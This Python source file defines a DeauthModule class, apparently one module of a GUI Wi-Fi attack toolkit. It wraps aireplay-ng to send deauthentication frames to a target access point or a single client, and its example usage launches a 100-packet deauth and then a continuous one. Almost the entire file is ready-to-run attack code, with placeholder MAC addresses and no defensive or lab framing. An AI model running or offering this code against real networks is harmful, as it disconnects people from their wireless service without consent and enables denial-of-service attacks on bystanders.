import time
from BaseModule import BaseModule # Assuming BaseModule is in BaseModule.py

class DeauthModule(BaseModule):
    def __init__(self, interface: str):
        super().__init__(interface)

    def start(self, bssid: str, client_mac: str = None, packets: int = 0):
        """
        Starts a deauthentication attack.
        Args:
            bssid (str): The MAC address of the target Access Point.
            client_mac (str, optional): The MAC address of the target client.
                                        If None, deauths all clients on the AP.
            packets (int): Number of deauth packets to send. 0 for continuous.
        """
        print(f"Starting Deauthentication Attack on {self.interface}...")
        self.status = "running"
        self._clear_buffers()

        command = [
            'sudo', 'aireplay-ng',
            '--deauth', str(packets) # Number of deauth packets (0 for continuous)
        ]
        if client_mac:
            command.extend(['-c', client_mac]) # Target specific client
        command.extend(['-a', bssid]) # Target Access Point
        command.append(self.interface) # Interface in monitor mode

        print(f"Deauth command: {' '.join(command)}")

        # Start the deauth process. It will run until stopped or packets count reached.
        self._run_command(command, capture_output=True, wait=True)
        # Note: aireplay-ng --deauth 0 will run indefinitely.
        # If packets > 0, it will finish and self.status will be "finished".
        # If packets = 0, you must manually call stop().

        if self.status == "finished":
            print(f"Deauthentication attack on {bssid} completed (sent {packets} packets).")
        elif self.status == "running": # Means it was continuous and stopped by an external call
             print(f"Deauthentication attack on {bssid} is running or stopped externally.")
        else:
             print(f"Deauthentication attack on {bssid} failed to start or encountered an error.")


# Example Usage (simulate GUI interaction)
if __name__ == "__main__":
    # Ensure your interface is in monitor mode before running this!
    test_interface = "wlan0mon" # Replace with your actual monitor interface
    target_bssid = "00:11:22:33:44:55" # Replace with a target AP BSSID
    target_client = "AA:BB:CC:DD:EE:FF" # Optional: Replace with a target client MAC

    print(f"Please ensure {test_interface} is in monitor mode and you have sudo rights.")
    # From a terminal: sudo airmon-ng start wlan0 (replace wlan0)

    deauther = DeauthModule(test_interface)

    # Example 1: Deauth all clients from an AP (send 100 packets)
    print(f"\nStarting deauth for AP {target_bssid} (100 packets)...")
    deauther.start_threaded(bssid=target_bssid, packets=100)
    time.sleep(5) # Let it run for a bit
    print("Checking status:", deauther.get_status())
    # You'd check if status becomes 'finished' or 'error' in your GUI
    if deauther.thread and deauther.thread.is_alive():
        deauther.thread.join(timeout=10) # Wait for it to finish if it's a short attack
        if deauther.thread.is_alive():
            print("Deauth thread still alive after join timeout (might be continuous or stuck).")
            deauther.stop_threaded() # Force stop if it's still running

    print("\n--- Output from first deauth attempt ---")
    stdout, stderr = deauther.get_output()
    print("STDOUT:", stdout)
    print("STDERR:", stderr)


    # Example 2: Continuous deauth on a specific client (needs manual stop)
    print(f"\nStarting continuous deauth for client {target_client} on AP {target_bssid} (needs manual stop)...")
    deauther_cont = DeauthModule(test_interface) # New instance for a new attack
    deauther_cont.start_threaded(bssid=target_bssid, client_mac=target_client, packets=0)

    print("Continuous deauth is running for 10 seconds...")
    time.sleep(10)
    print("Stopping continuous deauth...")
    deauther_cont.stop_threaded()
    time.sleep(2) # Give it a moment to stop
    print("Final status of continuous deauth:", deauther_cont.get_status())
    print("\n--- Output from second deauth attempt ---")
    stdout_cont, stderr_cont = deauther_cont.get_output()
    print("STDOUT:", stdout_cont)
    print("STDERR:", stderr_cont)
